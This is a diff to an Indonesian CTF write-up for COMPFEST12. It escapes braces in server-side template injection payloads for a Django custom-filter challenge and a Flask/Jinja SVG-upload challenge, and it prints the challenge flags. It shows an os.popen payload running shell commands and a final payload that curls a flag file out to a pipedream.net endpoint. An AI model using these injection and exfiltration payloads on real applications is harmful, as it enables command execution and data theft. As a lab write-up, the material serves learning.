@@ -1262,7 +1262,7 @@ $flag = 'COMPFEST12{lOc4l_fiLe_inClusion_f0r_FUN_and_profit_35c28478ab}';
 
 ## 7. Super Secure Filter [280pts]
 
-Input asal untuk mentriger error `{{ 4 }}` untuk mengecek apakah debug dihidupkan. Dan ternyata benar debug hidup.
+Input asal untuk mentriger error `\{\{ 4 \}\}` untuk mengecek apakah debug dihidupkan. Dan ternyata benar debug hidup.
 
 Error dibagian `/code/myapp/views.py in homepage` terdapat sesuatu yang mencurigakan, yaitu terdapat request context `arthropods` yang memiliki `other`.
 
@@ -1282,7 +1282,7 @@ a = angkabukan(''.join(data.split()[1:-1]))
 template = Template(TEMP.format( "{{ " + data.split()[1].replace('mammals', 'mammals|safe').replace('pisces', 'pisces|safe').replace('amfibi', 'amfibi|safe') + "|safe }}" + a))
 ```
 
-Didapatkan juga fungsi-fungsi yang mempermudah untuk mendapatkan flag pada error `/code/myapp/templatetags/myfilters.py in angkabukan`.
+Didapatkan juga fungsi-fungsi yang mempermudah untuk mendapatkan flag, yaitu error pada `/code/myapp/templatetags/myfilters.py`.
 
 ```py
 @register.filter(name='ambildong')
@@ -1315,7 +1315,7 @@ Dengan memanfaatkan fungsi `isinya` yaitu dengan payload `{{ arthropods|isinya }
 
 Lalu, manfaatkan fungsi `ambildong` untuk memanggil dir dari `arthropods` yang ditemukan flag pada dir `__doc__`.
 
-Payload: `{{ arthropods|ambildong:"__doc__" }}`
+Payload: `\{\{ arthropods|ambildong:"__doc__" \}\}`
 
 ```py
 COMPFEST12{djan90_cu5t0m_t3mplat3_f1Lters_d0nt_forg3t_t0_set_debu9_fal5e}
@@ -1337,7 +1337,7 @@ svg
 <class 'str'><br><br><br>image None <class 'str'><br><br><br>
 ```
 
-Template Injection, dengan menambahkan `{{ 2*2 }}` pada svg file.
+Template Injection, dengan menambahkan `\{\{ 2*2 \}\}` pada svg file.
 
 ```html
 svg 
@@ -1348,7 +1348,7 @@ Selanjutnya dilakukan template injection dengan menggunakan fungsi dari os modul
 
 ```py
 <svg>
-    <image>{{ config.__class__.__init__.__globals__['os'].popen('ls -la /').read() }}</image>
+    <image>\{\{ config.__class__.__init__.__globals__['os'].popen('ls -la /').read() \}\}</image>
 </svg>
 ```
 
@@ -1393,7 +1393,7 @@ Setelah itu, upload file flag menggunakan `curl` dari server, berikut final payl
 
 ```py
 <svg>
-    <image>{{ config.__class__.__init__.__globals__['os'].popen('curl https://c6d3e760ca0abf721ac9c4ffb61a5ed0.m.pipedream.net --upload-file /loooool_ini_lho_fl4gnya').read() }}</image>
+    <image>\{\{ config.__class__.__init__.__globals__['os'].popen('curl https://c6d3e760ca0abf721ac9c4ffb61a5ed0.m.pipedream.net --upload-file /loooool_ini_lho_fl4gnya').read() \}\}</image>
 </svg>
 ```
 
